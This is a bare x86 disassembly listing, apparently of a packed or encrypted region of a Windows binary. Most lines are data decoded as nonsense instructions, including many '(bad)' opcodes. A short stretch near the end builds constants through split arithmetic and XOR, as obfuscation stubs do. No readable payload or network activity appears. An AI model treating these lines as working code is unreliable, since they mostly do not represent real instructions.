  41e23e:	outs   dx,DWORD PTR ds:[esi]
  41e23f:	fucom  st(4)
  41e241:	mov    dh,0xc3
  41e243:	(bad)  
  41e244:	sub    DWORD PTR [ebp-0xc],eax
  41e247:	imul   ecx,DWORD PTR [ecx+0x76],0xffffff9b
  41e24b:	and    eax,0x69354d23
  41e250:	cmp    esi,edx
  41e252:	sub    al,0xbf
  41e254:	push   cs
  41e255:	pusha  
  41e256:	jmp    0x41e228
  41e258:	lea    ebx,[eax-0x5]
  41e25b:	mov    ecx,0x34f15d4e
  41e260:	mov    edx,edi
  41e262:	cmp    ah,ah
  41e264:	fidivr WORD PTR [eax-0x40]
  41e267:	(bad)  
  41e268:	fnsave [ebx+0x783d59de]
  41e26e:	mov    dh,0xe1
  41e270:	popf   
  41e271:	inc    eax
  41e272:	and    al,0x33
  41e274:	mov    edx,0x3f411adc
  41e279:	mov    ecx,0xced977e4
  41e27e:	test   al,0x97
  41e280:	aaa    
  41e281:	sahf   
  41e282:	addr16 sbb eax,0xe9cc39c7
  41e288:	pop    ebx
  41e289:	(bad)  
  41e28a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e28b:	popf   
  41e28c:	jmp    0x41e287
  41e28e:	int    0x88
  41e290:	lock enter 0xbcb2,0xee
  41e295:	add    eax,0x2eee1442
  41e29a:	test   DWORD PTR ds:0xcc0655de,esp
  41e2a0:	mov    dl,0x95
  41e2a2:	aad    0xf1
  41e2a4:	cld    
  41e2a5:	ror    BYTE PTR [eax-0x49],cl
  41e2a8:	adc    bh,BYTE PTR [eax-0x24bf163]
  41e2ae:	(bad)  
  41e2af:	jg     0x41e249
  41e2b1:	push   edi
  41e2b2:	dec    edx
  41e2b3:	cmp    ecx,DWORD PTR [edi+0x4d]
  41e2b6:	(bad)  
  41e2b7:	jae    0x41e319
  41e2b9:	pop    ebx
  41e2ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2bb:	iret   
  41e2bc:	cli    
  41e2bd:	jo     0x41e27d
  41e2bf:	jecxz  0x41e2cb
  41e2c1:	xchg   edi,eax
  41e2c2:	retf   0x371a
  41e2c5:	inc    eax
  41e2c6:	and    eax,0xe568a326
  41e2cb:	outs   dx,BYTE PTR cs:[esi]
  41e2cd:	out    dx,al
  41e2ce:	and    DWORD PTR [ebx-0x65489fa9],esi
  41e2d4:	ja     0x41e337
  41e2d6:	mov    ds:0x35b60785,eax
  41e2db:	pop    ebx
  41e2dc:	hlt    
  41e2dd:	and    al,0xd
  41e2df:	data16 sub al,0x2f
  41e2e2:	iret   
  41e2e3:	daa    
  41e2e4:	int3   
  41e2e5:	sti    
  41e2e6:	sub    edi,ebp
  41e2e8:	jno    0x41e366
  41e2ea:	mov    ch,0xac
  41e2ec:	mov    ecx,0x3aafcb40
  41e2f1:	lock scas al,BYTE PTR es:[edi]
  41e2f3:	pop    esi
  41e2f4:	xchg   edi,eax
  41e2f5:	int3   
  41e2f6:	les    esp,FWORD PTR [ecx+0x7189b8ad]
  41e2fc:	(bad)  
  41e2fd:	repz and DWORD PTR [edi+0x7e526d70],0x59
  41e305:	pop    ebp
  41e306:	lods   eax,DWORD PTR ds:[esi]
  41e307:	dec    edi
  41e308:	inc    edx
  41e309:	nop
  41e30a:	mov    ecx,0xdcd4ee55
  41e30f:	sub    ebx,DWORD PTR [esi]
  41e311:	fistp  DWORD PTR [ebx+0x2869d845]
  41e317:	push   esi
  41e318:	stos   BYTE PTR es:[edi],al
  41e319:	loope  0x41e2c9
  41e31b:	xor    dh,BYTE PTR [ebx-0x24469513]
  41e321:	repnz dec ebx
  41e323:	out    0x55,al
  41e325:	add    BYTE PTR [eax],dh
  41e327:	loope  0x41e2de
  41e329:	aad    0xd6
  41e32b:	mov    al,ds:0x5beb0131
  41e330:	ror    ecx,1
  41e332:	adc    dh,BYTE PTR [eax-0x39]
  41e335:	popa   
  41e336:	adc    eax,0x5b6c15e9
  41e33b:	add    DWORD PTR [ebx-0x3e],edi
  41e33e:	jb     0x41e35d
  41e340:	mov    esi,DWORD PTR ds:0xbaa4275d
  41e346:	mov    gs,WORD PTR [ebp+0x39]
  41e349:	push   ds
  41e34a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e34b:	(bad)  
  41e34c:	cmc    
  41e34d:	gs addr16 pop ds
  41e350:	dec    edx
  41e351:	add    esp,DWORD PTR [eax+0x175f3447]
  41e357:	cmp    ebx,ecx
  41e359:	in     eax,dx
  41e35a:	pop    ebp
  41e35b:	repz and ebp,ecx
  41e35e:	mov    esp,0x4200e63f
  41e363:	ds mov al,0xed
  41e366:	dec    eax
  41e367:	dec    edx
  41e368:	stos   DWORD PTR es:[edi],eax
  41e369:	ds mov bl,0x45
  41e36c:	adc    eax,0xda1c06f4
  41e371:	adc    edx,DWORD PTR [ecx+0x164125bf]
  41e377:	ins    DWORD PTR es:[edi],dx
  41e378:	mov    esi,0x7f74fbe9
  41e37d:	mov    BYTE PTR [ebp+0x3ed7c9ce],ah
  41e383:	rol    DWORD PTR [esi-0x68],cl
  41e386:	icebp  
  41e387:	and    dl,BYTE PTR [ecx+0x2721eb7c]
  41e38d:	push   eax
  41e38e:	dec    ebp
  41e38f:	adc    eax,DWORD PTR [ebx-0x27]
  41e392:	sbb    al,0xb9
  41e394:	cmp    ah,ch
  41e396:	mov    ah,BYTE PTR [edx-0x22]
  41e399:	(bad)  
  41e39a:	xor    eax,0x198b266f
  41e39f:	pop    edi
  41e3a0:	jae    0x41e382
  41e3a2:	jecxz  0x41e3a6
  41e3a4:	mov    ecx,0x9033d8d5
  41e3a9:	repz enter 0xab02,0x2e
  41e3ae:	into   
  41e3af:	and    al,0xa
  41e3b1:	test   BYTE PTR ds:0x9601c04,bl
  41e3b7:	pop    ds
  41e3b8:	push   ecx
  41e3b9:	dec    esp
  41e3ba:	mov    gs,ecx
  41e3bc:	pushf  
  41e3bd:	addr16 iret 
  41e3bf:	pop    edx
  41e3c0:	js     0x41e40f
  41e3c2:	jno    0x41e40d
  41e3c4:	iret   
  41e3c5:	fs push ds
  41e3c7:	js     0x41e3a8
  41e3c9:	or     al,0xe3
  41e3cb:	ja     0x41e426
  41e3cd:	mov    al,BYTE PTR [ebx-0x64]
  41e3d0:	cmp    ah,BYTE PTR [ebp+edx*1+0x19]
  41e3d4:	(bad)  [edx-0x5a]
  41e3d7:	xor    eax,edi
  41e3d9:	lods   eax,DWORD PTR ds:[esi]
  41e3da:	in     eax,dx
  41e3db:	xchg   edx,eax
  41e3dc:	and    al,0x93
  41e3de:	(bad)
  41e3e1:	std    
  41e3e2:	sar    DWORD PTR [esi+edx*4],cl
  41e3e5:	inc    ebx
  41e3e6:	xor    bh,0x67
  41e3e9:	ins    DWORD PTR es:[edi],dx
  41e3ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3eb:	dec    esi
  41e3ec:	add    al,0x17
  41e3ee:	pop    ss
  41e3ef:	repnz std 
  41e3f1:	xchg   edx,eax
  41e3f2:	into   
  41e3f3:	pushf  
  41e3f4:	dec    ebp
  41e3f5:	icebp  
  41e3f6:	fnstsw WORD PTR es:[esi+0x4b90473e]
  41e3fd:	dec    ecx
  41e3fe:	lahf   
  41e3ff:	sbb    edx,edx
  41e401:	mov    edx,0x489ecdba
  41e406:	mov    eax,ds:0xa11afcb6
  41e40b:	std    
  41e40c:	arpl   WORD PTR [ecx+0x2cdd1674],dx
  41e412:	jg     0x41e487
  41e414:	(bad)  
  41e415:	xchg   esp,eax
  41e416:	push   ds
  41e417:	nop
  41e418:	add    ebx,esi
  41e41a:	sub    DWORD PTR [edi+eax*8],ebp
  41e41d:	adc    bl,ah
  41e41f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e420:	stos   DWORD PTR es:[edi],eax
  41e421:	cs push es
  41e423:	(bad)  
  41e424:	xor    edi,DWORD PTR [esi+ecx*2]
  41e427:	ror    edi,1
  41e429:	add    edx,DWORD PTR [edx]
  41e42b:	lock mov edx,0x6acde98f
  41e431:	fistp  WORD PTR [ebx]
  41e433:	push   edx
  41e434:	sbb    eax,0xbe38f22f
  41e439:	push   esp
  41e43a:	pop    edi
  41e43b:	imul   esp,DWORD PTR [edi-0x79],0xffffffa5
  41e43f:	dec    edi
  41e440:	xchg   esp,eax
  41e441:	iret   
  41e442:	inc    edx
  41e443:	xor    esp,DWORD PTR [edx+eiz*8+0x7f]
  41e447:	dec    esp
  41e448:	pushf  
  41e449:	inc    ebx
  41e44a:	ja     0x41e4b3
  41e44c:	inc    eax
  41e44d:	pop    edi
  41e44e:	pop    ecx
  41e44f:	add    BYTE PTR [eax+0x7a132735],dh
  41e455:	push   ebx
  41e456:	(bad)  
  41e457:	in     al,0xf9
  41e459:	jae    0x41e4a0
  41e45b:	icebp  
  41e45c:	push   ebp
  41e45d:	and    DWORD PTR [ecx-0x294e044d],ebx
  41e463:	dec    esi
  41e464:	clc    
  41e465:	outs   dx,BYTE PTR ds:[esi]
  41e466:	retf   
  41e467:	rcr    DWORD PTR [ebx+ecx*2],0x10
  41e46b:	retf   
  41e46c:	daa    
  41e46d:	fcom   DWORD PTR [edx-0x7f]
  41e470:	mov    BYTE PTR [ebx-0x472f86cd],dl
  41e476:	xor    ch,BYTE PTR [ebx+edi*1]
  41e479:	(bad)  
  41e47a:	ficom  WORD PTR ds:0xe44cbfe5
  41e480:	fadd   st,st(6)
  41e482:	in     eax,0xed
  41e484:	stc    
  41e485:	push   ebp
  41e486:	pop    eax
  41e487:	sbb    BYTE PTR [esi],dl
  41e489:	mov    ds:0x13dfafc5,al
  41e48e:	rol    DWORD PTR [eax],0xca
  41e491:	out    0x62,eax
  41e493:	ja     0x41e481
  41e495:	lock je 0x41e424
  41e498:	imul   edi,DWORD PTR [edi+0x33c89823],0x439f612b
  41e4a2:	fs or  al,0x6c
  41e4a5:	pop    ebp
  41e4a6:	dec    ebx
  41e4a7:	jb     0x41e4ea
  41e4a9:	sub    BYTE PTR [ecx+0x41],dl
  41e4ac:	jo     0x41e4cb
  41e4ae:	sahf   
  41e4af:	fistp  WORD PTR ds:0x7a1f1109
  41e4b5:	xor    al,0x59
  41e4b7:	imul   ebx,DWORD PTR [ebp+0x7827c60a],0x5f
  41e4be:	dec    edx
  41e4bf:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41e4c1:	sahf   
  41e4c2:	jecxz  0x41e473
  41e4c4:	into   
  41e4c5:	hlt    
  41e4c6:	enter  0xf72b,0x21
  41e4ca:	push   0xf0ee888d
  41e4cf:	push   ss
  41e4d0:	xor    eax,0x71ead0ed
  41e4d5:	xchg   DWORD PTR [eax-0x56a20e03],ecx
  41e4db:	mov    ebx,0x990d70f0
  41e4e0:	xor    bh,BYTE PTR [esi+0x23]
  41e4e3:	mov    BYTE PTR [edi+edx*8-0x67c97a8b],bh
  41e4ea:	mov    bl,0xa
  41e4ec:	rol    BYTE PTR [ebx+ebp*1-0x78c3025],1
  41e4f3:	lds    esi,FWORD PTR [eax+0x5ed603d6]
  41e4f9:	push   ebp
  41e4fa:	ret    
  41e4fb:	sbb    al,0x47
  41e4fd:	xor    DWORD PTR [edx],esi
  41e4ff:	sbb    DWORD PTR [edx+0x69],0xffffff92
  41e503:	sub    al,0x48
  41e505:	or     DWORD PTR [eax],esi
  41e507:	jns    0x41e497
  41e509:	inc    edi
  41e50a:	(bad)  
  41e50b:	cmp    BYTE PTR [edi+ecx*4-0x21],dh
  41e50f:	inc    edx
  41e510:	push   eax
  41e511:	repnz mov cl,0xb6
  41e514:	xor    al,0x78
  41e516:	xor    DWORD PTR [ecx+0x6d],ebp
  41e519:	mov    ebp,ds
  41e51b:	mov    ebx,0x66fc5c5d
  41e520:	mov    bh,0x75
  41e522:	jge    0x41e5a3
  41e524:	aas    
  41e525:	dec    ebp
  41e526:	xchg   esp,eax
  41e527:	cwde   
  41e528:	cmp    al,0x8c
  41e52a:	push   ds
  41e52b:	addr16 int3 
  41e52d:	inc    edi
  41e52e:	ja     0x41e594
  41e530:	fdiv   QWORD PTR [esi-0xd]
  41e533:	push   cs
  41e534:	adc    bh,0xbf
  41e537:	retf   
  41e538:	sbb    al,dl
  41e53a:	aam    0xbb
  41e53c:	and    al,0x4a
  41e53e:	ins    DWORD PTR es:[edi],dx
  41e53f:	xchg   ebx,eax
  41e540:	sti    
  41e541:	test   DWORD PTR [eax],esp
  41e543:	push   cs
  41e544:	sub    al,dh
  41e546:	icebp  
  41e547:	jo     0x41e5bc
  41e549:	sub    al,0x50
  41e54b:	sar    DWORD PTR [ebx+0x68],cl
  41e54e:	mov    ecx,0xc4ee1e42
  41e553:	adc    edi,0xf549f914
  41e559:	scas   eax,DWORD PTR es:[edi]
  41e55a:	icebp  
  41e55b:	inc    esp
  41e55c:	dec    ecx
  41e55d:	sti    
  41e55e:	add    BYTE PTR [esi+0x5e],dl
  41e561:	mov    al,ds:0x31cde50b
  41e566:	lock xchg esp,eax
  41e568:	cmp    eax,0x84dbf6b
  41e56d:	jge    0x41e508
  41e56f:	push   edi
  41e570:	mov    eax,ds:0x107cf363
  41e575:	mov    ebp,0x756fe150
  41e57a:	ins    BYTE PTR es:[edi],dx
  41e57b:	xchg   dh,bh
  41e57d:	in     al,0x63
  41e57f:	lods   eax,DWORD PTR ds:[esi]
  41e580:	ss push esi
  41e582:	or     dh,BYTE PTR [edx]
  41e584:	sub    bl,BYTE PTR [edx-0x6abedfd1]
  41e58a:	and    ah,0xf7
  41e58d:	jne    0x41e582
  41e58f:	or     eax,0xb32697d6
  41e594:	rol    ecx,cl
  41e596:	push   edx
  41e597:	cs dec edx
  41e599:	scas   eax,DWORD PTR es:[edi]
  41e59a:	clc    
  41e59b:	stc    
  41e59c:	xchg   ebx,eax
  41e59d:	bound  ebx,QWORD PTR [esi-0x5d]
  41e5a0:	xor    DWORD PTR [edi+edi*2+0x396caf0e],ecx
  41e5a7:	jns    0x41e5cc
  41e5a9:	dec    esi
  41e5aa:	mov    cl,BYTE PTR [eax]
  41e5ac:	sbb    BYTE PTR [edi],ah
  41e5ae:	lds    edi,FWORD PTR [edx-0x2a3a907]
  41e5b4:	js     0x41e5e6
  41e5b6:	or     BYTE PTR [edx],al
  41e5b8:	push   eax
  41e5b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5ba:	int    0xd7
  41e5bc:	scas   al,BYTE PTR es:[edi]
  41e5bd:	jge    0x41e548
  41e5bf:	sub    BYTE PTR [edx*1-0x7c7bc1d9],al
  41e5c6:	mov    bh,al
  41e5c8:	cmp    DWORD PTR [ecx+0x27],edi
  41e5cb:	pop    ecx
  41e5cc:	rol    esp,1
  41e5ce:	nop
  41e5cf:	sbb    edi,DWORD PTR [ebp+edx*4+0x13a794a9]
  41e5d6:	inc    edx
  41e5d7:	push   es
  41e5d8:	push   0x9ce3d955
  41e5dd:	sub    BYTE PTR [edx-0x1],cl
  41e5e0:	jb     0x41e60e
  41e5e2:	sahf   
  41e5e3:	mov    al,BYTE PTR [edi]
  41e5e5:	daa    
  41e5e6:	pusha  
  41e5e7:	inc    ebx
  41e5e8:	mov    eax,ds:0x94ee8ba0
  41e5ed:	fldenv [eax]
  41e5ef:	push   0x4b2188ed
  41e5f4:	lds    ebx,FWORD PTR [edi-0x160ddecd]
  41e5fa:	inc    esi
  41e5fb:	xor    bh,al
  41e5fd:	mov    WORD PTR [edx],?
  41e5ff:	inc    esp
  41e600:	in     eax,0x9b
  41e602:	lods   al,BYTE PTR ds:[esi]
  41e603:	and    ecx,DWORD PTR [edi+ebp*8-0x45]
  41e607:	xor    BYTE PTR [eax+0x52],ch
  41e60a:	das    
  41e60b:	popa   
  41e60c:	je     0x41e626
  41e60e:	lock (bad) 
  41e610:	jbe    0x41e5a5
  41e612:	mov    dl,0xa2
  41e614:	jg     0x41e5d5
  41e616:	and    al,dh
  41e618:	cld    
  41e619:	cmp    dh,BYTE PTR [esi-0x510f0601]
  41e61f:	or     al,BYTE PTR [edx]
  41e621:	jge    0x41e5fb
  41e623:	mov    esp,0xa72b0afb
  41e628:	inc    edi
  41e629:	and    al,0xeb
  41e62b:	sbb    eax,0xa5377e28
  41e630:	hlt    
  41e631:	cld    
  41e632:	cwde   
  41e633:	addr16 xchg ebp,eax
  41e635:	jmp    0x41e5d7
  41e637:	imul   esi,DWORD PTR [ecx+0x230807f3],0x7732fc19
  41e641:	push   ebx
  41e642:	stc    
  41e643:	es jmp 0xc1cf:0xbf760fd8
  41e64b:	push   eax
  41e64c:	in     eax,dx
  41e64d:	sbb    al,0x88
  41e64f:	scas   eax,DWORD PTR es:[edi]
  41e650:	pop    es
  41e651:	lock stos DWORD PTR es:[edi],eax
  41e653:	into   
  41e654:	pusha  
  41e655:	js     0x41e6c9
  41e657:	std    
  41e658:	out    dx,al
  41e659:	pop    eax
  41e65a:	xchg   esi,eax
  41e65b:	stc    
  41e65c:	cmp    BYTE PTR [eax+eiz*4+0x7dd1770a],bl
  41e663:	push   0x968f99e4
  41e668:	sahf   
  41e669:	xlat   BYTE PTR ds:[ebx]
  41e66a:	mov    WORD PTR [edi],ds
  41e66c:	jle    0x41e671
  41e66e:	(bad)  
  41e66f:	push   ebx
  41e670:	dec    eax
  41e671:	xor    DWORD PTR [eax-0x3],esi
  41e674:	cli    
  41e675:	rcr    BYTE PTR [ebx+0x14a61364],0x25
  41e67c:	ins    DWORD PTR es:[edi],dx
  41e67d:	push   es
  41e67e:	outs   dx,BYTE PTR ds:[esi]
  41e67f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e680:	cmp    DWORD PTR [edi],ebp
  41e682:	addr16 cmc 
  41e684:	push   ebp
  41e685:	daa    
  41e686:	jae    0x41e6ee
  41e688:	adc    BYTE PTR [ecx],dl
  41e68a:	mov    ds:0xe783f00c,al
  41e68f:	pop    esp
  41e690:	nop
  41e691:	inc    edx
  41e692:	dec    di
  41e694:	cmp    al,0xa2
  41e696:	out    0x9d,eax
  41e698:	add    cl,BYTE PTR [ecx]
  41e69a:	inc    edi
  41e69b:	and    BYTE PTR [edx],ah
  41e69d:	xor    al,0x4f
  41e69f:	and    dh,ch
  41e6a1:	add    DWORD PTR [edx+eax*8],ebp
  41e6a4:	add    bl,BYTE PTR [ebp-0x17f776ef]
  41e6aa:	retf   
  41e6ab:	fldenv [edi-0x5b108eed]
  41e6b1:	push   ss
  41e6b2:	xchg   DWORD PTR [eax],edi
  41e6b4:	add    ah,dh
  41e6b6:	or     al,0x7f
  41e6b8:	fs (bad) 
  41e6ba:	mov    esp,0x17794bcb
  41e6bf:	xor    DWORD PTR [ecx-0x60],eax
  41e6c2:	adc    al,0xf9
  41e6c4:	aaa    
  41e6c5:	add    bl,ah
  41e6c7:	sbb    eax,0x9400af65
  41e6cc:	pop    eax
  41e6cd:	dec    edx
  41e6ce:	repnz test eax,0xd6fe34e3
  41e6d4:	cdq    
  41e6d5:	int3   
  41e6d6:	ror    ah,1
  41e6d8:	stos   DWORD PTR es:[edi],eax
  41e6d9:	imul   esp,DWORD PTR [ebp+0x59],0x4c5809ae
  41e6e0:	test   dh,bh
  41e6e2:	test   BYTE PTR [edx],ah
  41e6e4:	cmc    
  41e6e5:	jae    0x41e746
  41e6e7:	xchg   esp,eax
  41e6e8:	out    0x82,eax
  41e6ea:	fimul  WORD PTR [eax-0xb36e75f]
  41e6f0:	add    ch,BYTE PTR [ebx]
  41e6f2:	enter  0x1d41,0x1a
  41e6f6:	lock imul edx,DWORD PTR [ebp-0x3e],0x2d
  41e6fb:	stos   BYTE PTR es:[edi],al
  41e6fc:	push   0xffffffc2
  41e6fe:	push   eax
  41e6ff:	popf   
  41e700:	mov    dl,0xb
  41e702:	mov    edx,0x307a8dfe
  41e707:	out    dx,al
  41e708:	and    al,0x59
  41e70a:	icebp  
  41e70b:	or     esi,DWORD PTR [eax+0xa]
  41e70e:	cmp    DWORD PTR [eax],0xffffffef
  41e711:	scas   al,BYTE PTR es:[edi]
  41e712:	stc    
  41e713:	push   es
  41e714:	adc    DWORD PTR [ecx+0x6c],edi
  41e717:	fsub   st(0),st
  41e719:	fnstsw WORD PTR [ebp-0x3fc692fb]
  41e71f:	sbb    al,0x56
  41e721:	int3   
  41e722:	ja     0x41e777
  41e724:	aas    
  41e725:	es call 0xcf05cb79
  41e72b:	xchg   esp,eax
  41e72c:	dec    esi
  41e72d:	in     eax,dx
  41e72e:	mov    esi,0xa7bb19e8
  41e733:	add    DWORD PTR [edi+0x7],ecx
  41e736:	mov    edx,edx
  41e738:	or     edi,eax
  41e73a:	cmp    DWORD PTR [edi-0x37d05ee1],esi
  41e740:	sti    
  41e741:	sbb    al,BYTE PTR [ebx+0x60]
  41e744:	mov    eax,DWORD PTR [edx+0x4f4ede25]
  41e74a:	xchg   ebx,eax
  41e74b:	xchg   dh,ch
  41e74d:	mov    ds:0x3068032a,eax
  41e752:	jecxz  0x41e71f
  41e754:	call   0x6ec3abb7
  41e759:	mov    edi,0xb0e646a9
  41e75e:	aad    0xd9
  41e760:	call   0x5448:0x92ddc9c4
  41e767:	out    dx,al
  41e768:	inc    edx
  41e769:	push   ebp
  41e76a:	and    al,ah
  41e76c:	loope  0x41e7d0
  41e76e:	test   BYTE PTR [esi-0x4d],dl
  41e771:	out    0x42,al
  41e773:	shl    DWORD PTR [eax+0x20d332f8],0xd3
  41e77a:	data16 arpl WORD PTR [esi+eax*2+0x693c5cdf],ax
  41e782:	les    esp,FWORD PTR [esi-0x561b2ecd]
  41e788:	mov    al,0xef
  41e78a:	cdq    
  41e78b:	dec    edx
  41e78c:	mov    al,ds:0x12ad05b3
  41e791:	jmp    0x6689:0xdeeace8
  41e798:	test   DWORD PTR ds:0x4d309fe8,ebp
  41e79e:	or     BYTE PTR [ebp-0x19],cl
  41e7a1:	iret   
  41e7a2:	add    esp,DWORD PTR [edx]
  41e7a4:	pop    edx
  41e7a5:	mov    al,0x7f
  41e7a7:	sbb    al,0x16
  41e7a9:	add    DWORD PTR [ebx+0x7bbca849],ebp
  41e7af:	popf   
  41e7b0:	cmp    DWORD PTR [edi-0x5d],ebx
  41e7b3:	and    al,0xc6
  41e7b5:	pop    esp
  41e7b6:	scas   eax,DWORD PTR es:[edi]
  41e7b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7b8:	jns    0x41e7a8
  41e7ba:	lods   eax,DWORD PTR ds:[esi]
  41e7bb:	adc    eax,0x1c7ee381
  41e7c0:	dec    ebp
  41e7c1:	push   ecx
  41e7c2:	add    eax,0x7bdf6192
  41e7c7:	mov    ss,WORD PTR ds:0xa3f1fcac
  41e7cd:	mov    esp,0x1e92574
  41e7d2:	inc    ecx
  41e7d3:	jge    0x41e7aa
  41e7d5:	dec    ebp
  41e7d6:	popf   
  41e7d7:	dec    ebp
  41e7d8:	push   esi
  41e7d9:	cmp    DWORD PTR [eax+0x717532b9],ebx
  41e7df:	ud0    esp,DWORD PTR [ecx-0x63]
  41e7e3:	and    eax,0x628c39ed
  41e7e8:	out    dx,eax
  41e7e9:	sub    ebx,DWORD PTR [ebx]
  41e7eb:	or     cl,ch
  41e7ed:	jns    0x41e772
  41e7ef:	fild   DWORD PTR [esi+edx*1-0x63fba241]
  41e7f6:	int    0x97
  41e7f8:	pop    ds
  41e7f9:	jns    0x41e7ec
  41e7fb:	pop    ss
  41e7fc:	call   0x9843:0xc731fc75
  41e803:	inc    edx
  41e804:	adc    edx,0x12ec06b2
  41e80a:	shl    DWORD PTR [ebx],0xc7
  41e80d:	adc    DWORD PTR [esi+edi*4],edi
  41e810:	call   FWORD PTR [ecx+0x9]
  41e813:	repnz push edi
  41e815:	sub    bh,ah
  41e817:	xchg   edi,eax
  41e818:	icebp  
  41e819:	add    BYTE PTR [ecx-0x794f0496],bh
  41e81f:	hlt    
  41e820:	pop    esp
  41e821:	sbb    al,0x43
  41e823:	ja     0x41e84f
  41e825:	mov    eax,DWORD PTR [ebx+0x4a668bbf]
  41e82b:	xchg   ebx,eax
  41e82c:	cmp    BYTE PTR [ebx+0x27270230],dh
  41e832:	push   edi
  41e833:	fs repnz out 0xf,eax
  41e837:	std    
  41e838:	jecxz  0x41e7f5
  41e83a:	dec    ebx
  41e83b:	xchg   DWORD PTR [ebx+0x23],edi
  41e83e:	fistp  QWORD PTR [ebx]
  41e840:	jmp    0x56150880
  41e845:	fcmovnu st,st(5)
  41e847:	gs hlt 
  41e849:	scas   al,BYTE PTR es:[edi]
  41e84a:	mov    bl,0x87
  41e84c:	loop   0x41e891
  41e84e:	jp     0x41e817
  41e850:	mov    ch,0xa9
  41e852:	ret    0xe302
  41e855:	lds    esp,FWORD PTR [ebp-0x69]
  41e858:	pop    edi
  41e859:	pop    ebx
  41e85a:	loopne 0x41e860
  41e85c:	repz es jnp 0x41e8cc
  41e860:	aas    
  41e861:	leave  
  41e862:	add    bl,BYTE PTR ds:0x6994677e
  41e868:	adc    bl,bh
  41e86a:	adc    BYTE PTR ds:0x63eb11bb,al
  41e870:	mov    dl,0xe2
  41e872:	rol    BYTE PTR [esi],0x50
  41e875:	push   0xf692beb
  41e87a:	imul   esi,DWORD PTR [edi+0x5f9e27d8],0x52da0e5d
  41e884:	(bad)  
  41e885:	mov    ebp,0xddcf3b9b
  41e88a:	pop    eax
  41e88b:	addr16 inc eax
  41e88d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e88e:	inc    ebx
  41e88f:	mov    cl,0x6e
  41e891:	xchg   esi,eax
  41e892:	push   esp
  41e893:	xor    ch,BYTE PTR [ebx+ebp*4]
  41e896:	jb     0x41e8ea
  41e898:	sbb    edx,DWORD PTR [ebx-0x6e9b4644]
  41e89e:	mov    WORD PTR [ebx-0xb3d0911],es
  41e8a4:	gs and eax,0x45d3de12
  41e8aa:	fsub   st,st(1)
  41e8ac:	mov    ecx,0xa2fdf170
  41e8b1:	call   0xe1aadfc
  41e8b6:	in     al,dx
  41e8b7:	lea    ebp,[ecx-0x8331ca0]
  41e8bd:	add    al,0x2d
  41e8bf:	inc    ecx
  41e8c0:	scas   al,BYTE PTR es:[edi]
  41e8c1:	aam    0x1b
  41e8c3:	inc    ebp
  41e8c4:	xchg   ebx,eax
  41e8c5:	into   
  41e8c6:	arpl   WORD PTR [ebx-0x31afb1aa],dx
  41e8cc:	fs repz in al,0xc0
  41e8d0:	aam    0x97
  41e8d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8d3:	rcl    DWORD PTR [ecx+0x3dcddeb7],1
  41e8d9:	lock cmp bh,dl
  41e8dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8dd:	popf   
  41e8de:	sbb    eax,0x52d32243
  41e8e3:	js     0x41e8d4
  41e8e5:	in     eax,0x75
  41e8e7:	push   ds
  41e8e8:	or     ecx,DWORD PTR [eax+edx*1]
  41e8eb:	sub    al,0xed
  41e8ed:	sub    cl,bh
  41e8ef:	fisubr WORD PTR [esi-0x2]
  41e8f2:	rcr    ah,1
  41e8f4:	add    BYTE PTR [eax-0x80],al
  41e8f7:	pop    edi
  41e8f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8f9:	cmp    DWORD PTR [ebx-0x2ff2bb1f],0xffffffe5
  41e900:	pop    ebp
  41e901:	add    ch,dl
  41e903:	in     eax,dx
  41e904:	push   ecx
  41e905:	sbb    al,0xfd
  41e907:	xchg   edi,eax
  41e908:	or     eax,0xb842ad92
  41e90d:	pop    ds
  41e90e:	and    eax,0x82e1e48a
  41e913:	inc    edi
  41e914:	imul   edi,DWORD PTR [edx],0xffffffcc
  41e917:	cli    
  41e918:	push   0xbcaa80ce
  41e91d:	out    dx,eax
  41e91e:	les    esi,FWORD PTR [ebp+edi*1-0x22]
  41e922:	push   esp
  41e923:	call   0xe867:0x6fc3344
  41e92a:	scas   eax,DWORD PTR es:[edi]
  41e92b:	cmp    DWORD PTR [esi-0x6ddb2a3a],0xffffff94
  41e932:	mov    esp,?
  41e934:	ins    BYTE PTR es:[edi],dx
  41e935:	pop    esi
  41e936:	or     ebx,DWORD PTR [eax]
  41e938:	jge    0x41e977
  41e93a:	pop    ebx
  41e93b:	nop
  41e93c:	xor    DWORD PTR [ecx],edi
  41e93e:	loopne 0x41e913
  41e940:	dec    edi
  41e941:	(bad)  
  41e942:	cli    
  41e943:	xchg   ecx,eax
  41e944:	cmp    esi,esi
  41e946:	or     al,0x5c
  41e948:	jmp    0x41e9ae
  41e94a:	xchg   ecx,eax
  41e94b:	sbb    esi,DWORD PTR [ebx]
  41e94d:	rol    BYTE PTR [ebx],1
  41e94f:	into   
  41e950:	add    edx,esi
  41e952:	cmp    ecx,edx
  41e954:	jae    0x420d77
  41e95a:	lea    edx,[ecx-0x3272dd]
  41e960:	mov    DWORD PTR [ebp-0x18],edx
  41e963:	mov    edi,DWORD PTR [ebp-0x18]
  41e966:	mov    DWORD PTR [ebp-0x24],0x705fd0f
  41e96d:	lea    edx,[ebp-0x24]
  41e970:	mov    DWORD PTR [ebp-0x10],edx
  41e973:	mov    edx,DWORD PTR [ebp-0x10]
  41e976:	add    DWORD PTR [edx],0x705fa0f
  41e97c:	mov    ebx,DWORD PTR [ebp-0x10]
  41e97f:	xor    edi,eax
  41e981:	add    edi,DWORD PTR [ebx]
  41e983:	lea    edx,[ebp+ecx*4-0x64]
  41e987:	mov    ebx,DWORD PTR [edx]
  41e989:	jmp    0x420d16
  41e98e:	add    ebx,DWORD PTR [esi]
  41e990:	(bad)  
  41e991:	jnp    0x41e95a
  41e993:	jnp    0x41e988
  41e995:	jbe    0x41e9c3
  41e997:	cs fldenv es:[edi+edi*1]
  41e99c:	xchg   ebx,eax
  41e99d:	push   ebp
